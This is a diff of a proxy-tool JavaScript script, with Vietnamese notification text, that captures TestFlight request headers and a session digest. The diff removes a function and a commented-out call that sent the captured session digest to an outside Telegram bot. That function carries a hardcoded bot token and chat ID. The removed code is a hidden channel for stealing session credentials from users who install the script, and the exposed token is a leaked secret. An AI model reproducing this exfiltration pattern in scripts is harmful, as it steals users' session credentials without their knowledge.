@@ -25,14 +25,10 @@ if (reg1.test($request.url)) {
     $persistentStore.write(ua, 'tf_ua')
     console.log($request.headers)
     if ($persistentStore.read('request_id') !== null) {
-      $notification.post('Thu thập thông tin TF', 'Thành công, vui lòng đóng tập lệnh!','')
-
+      $notification.post('Thu thập thông tin TF', 'Thành công, vui lòng đóng tập lệnh!',session_digest)
     } else {
       $notification.post('Thu thập thông tin TF','Không thành công, vui lòng bật công tắc Mitm qua HTTP2 và khởi động lại VPN và Ứng dụng TestFlight!','')
     }
-    // sendMessageToTelegram(
-    //                 `session_digest: ${session_digest}`
-    //               );
     $done({})
 }
 /*
@@ -55,41 +51,4 @@ if (reg2.test($request.url)) {
 */
 function unique(arr) {
   return Array.from(new Set(arr));
-}
-
-function sendMessageToTelegram(message) {
-  return new Promise((resolve, reject) => {
-    const chat_id = "608667192";
-    const telegrambot_token = "7125150542:AAFFYrU1SoVyBrnFi91KacR3rCIJfbM3FyY";
-    const url = `https://api.telegram.org/bot${telegrambot_token}/sendMessage`;
-    const body = {
-      chat_id: chat_id,
-      text: message,
-      entities: [{ type: "pre", offset: 0, length: message.length }],
-    };
-    const options = {
-      url: url,
-      body: JSON.stringify(body),
-      headers: {
-        "Content-Type": "application/json",
-      },
-    };
-
-    $httpClient
-      .post(options)
-      .then((response) => {
-        if (response.statusCode == 200) {
-          resolve(response);
-        } else {
-          reject(
-            new Error(
-              `Telegram API request failed with status code ${response.statusCode}`
-            )
-          );
-        }
-      })
-      .catch((error) => {
-        reject(error);
-      });
-  });
 }
